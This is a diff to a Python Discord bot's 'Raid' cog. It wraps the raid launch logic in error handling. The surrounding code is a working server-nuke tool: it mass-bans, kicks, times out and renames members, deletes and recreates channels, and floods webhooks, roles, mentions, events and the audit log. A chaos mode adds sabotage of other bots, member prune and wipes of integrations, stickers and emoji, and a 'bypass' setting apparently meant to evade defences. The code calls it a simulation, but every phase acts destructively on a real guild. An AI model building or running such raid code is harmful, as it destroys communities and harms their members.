@@ -137,89 +137,94 @@ class Raid(commands.Cog):
         # Defer early — we need to chunk members which takes a moment
         await interaction.response.defer()
 
-        # Force-fetch all members so guild.members is complete
         try:
-            await guild.chunk(cache=True)
-        except Exception:
-            pass
+            # Force-fetch all members so guild.members is complete
+            try:
+                await guild.chunk(cache=True)
+            except Exception:
+                pass
 
-        bot_state.reset()
-        bot_state.rate_controller.set_intensity(intensity)
-        bot_state.bypass.configure(intensity)
-        bot_state.active_simulation = "raid"
+            bot_state.reset()
+            bot_state.rate_controller.set_intensity(intensity)
+            bot_state.bypass.configure(intensity)
+            bot_state.active_simulation = "raid"
 
-        me = guild.me
-        members      = [m for m in guild.members if not m.bot and m.id != interaction.user.id]
-        all_bots     = [m for m in guild.members if m.bot and m.id != self.bot.user.id]
-        eligible     = [m for m in members if not skip_admins or not m.guild_permissions.administrator]
-        # Only target members the bot's role is actually above (prevents silent 403s)
-        bannable     = [m for m in eligible if m.top_role < me.top_role]
-        ban_targets  = bannable if mass_ban else []
-        kick_targets = bannable if mass_kick else []
-        to_timeout   = [m for m in members if m.top_role < me.top_role] if mass_timeout else []
-        nick_targets = members if mass_nickname else []
-        original_chs = list(guild.channels)
-        total_streams = new_channels * webhooks_per_channel
+            me = guild.me
+            members      = [m for m in guild.members if not m.bot and m.id != interaction.user.id]
+            all_bots     = [m for m in guild.members if m.bot and m.id != self.bot.user.id]
+            eligible     = [m for m in members if not skip_admins or not m.guild_permissions.administrator]
+            bannable     = [m for m in eligible if m.top_role < me.top_role]
+            ban_targets  = bannable if mass_ban else []
+            kick_targets = bannable if mass_kick else []
+            to_timeout   = [m for m in members if m.top_role < me.top_role] if mass_timeout else []
+            nick_targets = members if mass_nickname else []
+            original_chs = list(guild.channels)
+            total_streams = new_channels * webhooks_per_channel
 
-        chaos_label = "✅ ALL VECTORS" if chaos else "❌ core only"
-        await interaction.followup.send(
-            f"☠️ **{RAID_TAG} — RAID LAUNCHING** ☠️\n"
-            f"```\n"
-            f"Intensity : {intensity}/10\n"
-            f"Chaos mode: {chaos_label}\n"
-            f"Nuke      : {'✅ ' + str(len(original_chs)) + ' channels' if nuke_channels else '❌'}\n"
-            f"Channels  : ✅ {new_channels} text + {NEW_VOICE_CHANNELS} voice\n"
-            f"Webhooks  : ✅ {total_streams} streams\n"
-            f"Ban       : {'✅ ' + str(len(ban_targets)) + ' targets' if mass_ban else '❌'}\n"
-            f"Kick      : {'✅ ' + str(len(kick_targets)) + ' targets' if mass_kick else '❌'}\n"
-            f"Timeout   : {'✅ ' + str(len(to_timeout)) + ' targets' if mass_timeout else '❌'}\n"
-            f"Nickname  : {'✅ ' + str(len(nick_targets)) + ' members' if mass_nickname else '❌'}\n"
-            f"Roles     : {'✅ ' + str(NEW_ROLES) + ' roles' if role_flood else '❌'}\n"
-            f"```\n"
-            f"`/stop` cancels everything instantly."
-        )
-
-        # Pre-raid sabotage (chaos only) — runs first as a background task
-        if chaos:
-            t = asyncio.create_task(
-                self._phase_pre_raid(guild, all_bots)
+            chaos_label = "✅ ALL VECTORS" if chaos else "❌ core only"
+            await interaction.followup.send(
+                f"☠️ **{RAID_TAG} — RAID LAUNCHING** ☠️\n"
+                f"```\n"
+                f"Intensity : {intensity}/10\n"
+                f"Chaos mode: {chaos_label}\n"
+                f"Nuke      : {'✅ ' + str(len(original_chs)) + ' channels' if nuke_channels else '❌'}\n"
+                f"Channels  : ✅ {new_channels} text + {NEW_VOICE_CHANNELS} voice\n"
+                f"Webhooks  : ✅ {total_streams} streams\n"
+                f"Ban       : {'✅ ' + str(len(ban_targets)) + ' targets' if mass_ban else '❌'}\n"
+                f"Kick      : {'✅ ' + str(len(kick_targets)) + ' targets' if mass_kick else '❌'}\n"
+                f"Timeout   : {'✅ ' + str(len(to_timeout)) + ' targets' if mass_timeout else '❌'}\n"
+                f"Nickname  : {'✅ ' + str(len(nick_targets)) + ' members' if mass_nickname else '❌'}\n"
+                f"Roles     : {'✅ ' + str(NEW_ROLES) + ' roles' if role_flood else '❌'}\n"
+                f"```\n"
+                f"`/stop` cancels everything instantly."
             )
-            bot_state.add_task(t)
 
-        phases = [
-            self._phase_nuke_and_build(
-                guild, original_chs, new_channels, webhooks_per_channel,
-                msgs_per_webhook, nuke_channels,
-                invite_flood=chaos, embed_storm=chaos,
-            ),
-            self._phase_ban(guild, ban_targets),
-            self._phase_kick(guild, kick_targets),
-            self._phase_timeout(to_timeout),
-            self._phase_nickname(nick_targets),
-            self._phase_server(guild, strip_permissions),
-        ]
+            # Pre-raid sabotage (chaos only) — runs first as a background task
+            if chaos:
+                t = asyncio.create_task(self._phase_pre_raid(guild, all_bots))
+                bot_state.add_task(t)
 
-        if chaos:
-            phases += [
-                self._phase_voice_chaos(guild),
-                self._phase_mention_burst(guild),
-                self._phase_audit_flood(guild),
-                self._phase_prune(guild),
-                self._phase_integration_wipe(guild),
-                self._phase_sticker_wipe(guild),
-                self._phase_overwrite_storm(guild),
+            phases = [
+                self._phase_nuke_and_build(
+                    guild, original_chs, new_channels, webhooks_per_channel,
+                    msgs_per_webhook, nuke_channels,
+                    invite_flood=chaos, embed_storm=chaos,
+                ),
+                self._phase_ban(guild, ban_targets),
+                self._phase_kick(guild, kick_targets),
+                self._phase_timeout(to_timeout),
+                self._phase_nickname(nick_targets),
+                self._phase_server(guild, strip_permissions),
             ]
 
-        if role_flood:
-            phases.append(self._phase_roles(guild, perm_chaos=chaos))
-        if chaos:
-            phases.append(self._phase_emoji_wipe_flood(guild))
-            phases.append(self._phase_event_flood(guild))
-            phases.append(self._phase_wave_repeat(guild, msgs_per_webhook, embed_storm=True))
+            if chaos:
+                phases += [
+                    self._phase_voice_chaos(guild),
+                    self._phase_mention_burst(guild),
+                    self._phase_audit_flood(guild),
+                    self._phase_prune(guild),
+                    self._phase_integration_wipe(guild),
+                    self._phase_sticker_wipe(guild),
+                    self._phase_overwrite_storm(guild),
+                ]
 
-        for coro in phases:
-            t = asyncio.create_task(coro)
-            bot_state.add_task(t)
+            if role_flood:
+                phases.append(self._phase_roles(guild, perm_chaos=chaos))
+            if chaos:
+                phases.append(self._phase_emoji_wipe_flood(guild))
+                phases.append(self._phase_event_flood(guild))
+                phases.append(self._phase_wave_repeat(guild, msgs_per_webhook, embed_storm=True))
+
+            for coro in phases:
+                t = asyncio.create_task(coro)
+                bot_state.add_task(t)
+
+        except Exception as exc:
+            bot_state.active_simulation = None
+            try:
+                await interaction.followup.send(f"❌ Raid failed to launch: `{exc}`", ephemeral=True)
+            except Exception:
+                pass
 
     # ─────────────────────────────────────────────────────────────────────────
     # PHASE 00 — PRE-RAID SABOTAGE (chaos only)
